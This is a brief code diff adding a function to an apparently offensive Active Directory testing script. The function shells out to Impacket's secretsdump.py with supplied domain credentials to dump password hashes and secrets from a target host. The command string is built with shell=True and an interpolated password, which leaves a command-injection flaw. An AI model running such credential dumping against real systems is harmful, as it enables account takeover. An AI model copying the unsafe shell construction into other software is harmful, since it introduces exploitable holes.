@@ -246,3 +246,10 @@ def run_ldap(url, dc_1, dc_2):
         subprocess.run(command, shell=True)
     except Exception as e:
         print(f"{RED}Error running GetADUsers: {e}{RESET}")
+
+def run_secretsdump(url, domain, username, password):
+    try:
+        command = f"secretsdump.py {domain}/{username}:'{password}'@{url}"
+        subprocess.run(command, shell=True)
+    except Exception as e:
+        print(f"{RED}Error running secretsdump: {e}{RESET}")
